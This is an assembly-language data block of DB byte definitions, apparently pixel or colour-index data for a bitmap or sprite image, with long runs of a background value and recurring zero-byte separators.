DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,009H,00AH,00AH
DB 007H,008H,005H,005H,001H,009H,001H,009H,002H,009H,002H,009H,002H,009H,001H
DB 009H,001H,004H,004H,005H,008H,007H,00AH,004H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,002H,00AH,007H,008H,005H,004H,004H,009H,001H,009H,002H,009H,002H
DB 009H,002H,009H,002H,009H,001H,004H,004H,005H,005H,008H,006H,00AH,005H,000H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00FH,015H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,015H,015H,01AH,01AH,019H,00AH,00FH,008H,008H,008H,008H,008H
DB 008H,008H,008H,008H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H
DB 014H,01AH,01AH,019H,00DH,004H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,005H,00AH,006H,008H,005H,005H
DB 001H,009H,001H,009H,002H,009H,002H,009H,002H,009H,002H,009H,001H,004H,004H
DB 005H,005H,008H,008H,006H,008H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH
DB 00AH,008H,005H,005H,004H,004H,001H,009H,002H,009H,002H,009H,002H,009H,002H
DB 009H,001H,009H,001H,004H,004H,005H,008H,007H,00AH,007H,000H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,00DH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 015H,015H,01AH,01AH,019H,00AH,00DH,008H,008H,005H,008H,008H,008H,008H,005H
DB 008H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH
DB 019H,00DH,001H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,007H,00AH,007H,008H,005H,004H,004H,001H,009H
DB 001H,009H,002H,009H,002H,009H,002H,009H,002H,009H,001H,004H,004H,005H,005H
DB 008H,006H,006H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,00AH,008H,005H
DB 005H,004H,001H,009H,001H,009H,002H,002H,002H,009H,002H,009H,002H,009H,001H
DB 009H,001H,004H,005H,008H,007H,00AH,006H,000H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,00FH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,015H,01AH
DB 01AH,019H,00AH,00FH,00DH,00DH,010H,00DH,00DH,00DH,00DH,010H,010H,00AH,00AH
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,006H,00AH,007H,008H,005H,004H,001H,009H,001H,009H,002H,009H
DB 002H,009H,002H,002H,002H,009H,001H,009H,001H,004H,005H,005H,008H,006H,006H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,00AH,008H,005H,005H,004H,004H
DB 001H,009H,002H,009H,001H,009H,002H,002H,002H,009H,001H,009H,001H,004H,004H
DB 005H,005H,007H,00AH,007H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00DH
DB 015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,00AH,015H,015H,014H,00AH
DB 00AH,00AH,00AH,00AH,00AH,00AH,00AH,00AH,00AH,00AH,00DH,00DH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,001H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 007H,00AH,007H,005H,005H,004H,004H,001H,009H,002H,009H,002H,009H,002H,009H
DB 001H,009H,002H,009H,001H,004H,004H,005H,005H,008H,006H,007H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,001H,00AH,008H,005H,005H,004H,001H,009H,001H,004H
DB 005H,008H,005H,009H,002H,009H,002H,009H,001H,009H,004H,004H,005H,008H,008H
DB 00AH,008H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00FH,015H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,019H,015H,015H,015H,015H,015H,015H,015H,015H
DB 015H,015H,015H,015H,015H,015H,015H,015H,017H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,00AH,008H
DB 008H,005H,004H,001H,009H,001H,009H,002H,009H,002H,009H,005H,008H,005H,004H
DB 001H,009H,001H,004H,005H,005H,008H,006H,007H,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,006H,007H,008H,005H,004H,004H,001H,005H,008H,007H,006H,008H
DB 004H,009H,002H,009H,001H,009H,001H,004H,004H,005H,008H,007H,00AH,004H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00DH,015H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H
DB 014H,01AH,01AH,019H,00DH,001H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,00AH,007H,008H,005H,004H
DB 004H,001H,009H,001H,009H,002H,009H,004H,007H,006H,007H,008H,005H,001H,004H
DB 004H,005H,008H,007H,00AH,005H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 007H,006H,008H,005H,005H,004H,004H,008H,006H,00AH,00AH,007H,005H,001H,009H
DB 001H,009H,001H,004H,004H,005H,005H,008H,007H,00AH,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,00FH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH
DB 019H,00DH,004H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,00AH,007H,008H,005H,005H,004H,004H,001H
DB 009H,001H,009H,002H,005H,007H,00AH,00AH,006H,008H,004H,004H,005H,005H,008H
DB 007H,00AH,002H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,006H,008H
DB 008H,005H,004H,004H,008H,006H,00AH,00AH,007H,005H,009H,001H,009H,001H,004H
DB 004H,005H,005H,008H,008H,006H,007H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,00DH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,007H,006H,008H,008H,005H,005H,004H,004H,001H,009H,001H
DB 009H,005H,007H,00AH,00AH,006H,008H,004H,004H,005H,008H,008H,006H,006H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,00AH,007H,008H,005H,005H
DB 004H,008H,007H,006H,006H,007H,005H,001H,009H,001H,004H,004H,004H,005H,005H
DB 008H,007H,00AH,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00FH
DB 015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,019H,019H,019H,019H
DB 019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,00BH,00AH,007H,008H,005H,005H,004H,004H,004H,001H,009H,001H,005H,007H
DB 006H,006H,007H,008H,004H,005H,005H,008H,007H,00AH,005H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,006H,006H,007H,008H,005H,005H,005H,005H
DB 008H,008H,005H,001H,004H,001H,004H,004H,005H,005H,005H,008H,007H,00AH,007H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00DH,011H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,017H,00DH,00AH,00AH,00AH,00AH,00AH,00AH,00AH
DB 00AH,00AH,00AH,00AH,00DH,00DH,00DH,00DH,00DH,019H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H
DB 00AH,007H,008H,005H,005H,004H,004H,004H,001H,004H,001H,005H,008H,008H,005H
DB 005H,005H,005H,008H,007H,006H,006H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,001H,00AH,006H,007H,008H,005H,005H,005H,004H,005H,004H
DB 004H,004H,004H,004H,005H,005H,005H,008H,008H,006H,00AH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00FH,011H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,017H,015H,01AH,01AH,019H,00AH,010H,00DH,00AH,00AH,00AH,00FH
DB 00FH,00FH,00FH,00FH,00AH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H
DB 014H,01AH,01AH,019H,00DH,004H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00AH,006H,007H
DB 008H,005H,005H,005H,004H,004H,004H,004H,004H,005H,004H,005H,005H,005H,008H
DB 008H,006H,00AH,001H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,001H,006H,00AH,007H,008H,008H,005H,005H,005H,005H,005H,005H,005H
DB 005H,005H,008H,008H,007H,00AH,007H,002H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,00DH,011H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 017H,015H,01AH,01AH,019H,00AH,01BH,003H,008H,008H,008H,005H,005H,008H,005H
DB 005H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH
DB 019H,00DH,004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,002H,007H,00AH,007H,008H,008H
DB 005H,005H,005H,005H,005H,005H,005H,005H,005H,008H,008H,007H,00AH,006H,002H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,007H,00AH,006H,007H,008H,008H,008H,008H,008H,008H,008H,008H,008H,007H
DB 006H,00AH,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,00FH,011H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,015H,01AH
DB 01AH,019H,00AH,009H,01BH,009H,00EH,008H,008H,005H,005H,005H,005H,00FH,00AH
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,00AH,006H,007H,008H,008H,008H
DB 008H,008H,008H,008H,008H,008H,007H,006H,00AH,007H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H
DB 006H,00AH,006H,007H,007H,007H,008H,008H,007H,007H,006H,00AH,00AH,004H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00DH
DB 011H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,015H,01AH,01AH,019H,00AH
DB 001H,003H,01BH,008H,008H,008H,005H,008H,005H,005H,00FH,00AH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,004H,00AH,00AH,006H,007H,007H,007H,008H,007H
DB 007H,007H,006H,00AH,006H,005H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,005H,006H
DB 00AH,00AH,00AH,00AH,00AH,00AH,00AH,007H,005H,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,00FH,011H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,017H,015H,01AH,01AH,019H,00AH,009H,01BH,003H
DB 002H,008H,008H,005H,005H,005H,005H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,017H,014H,01AH,01AH,019H,00DH,004H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
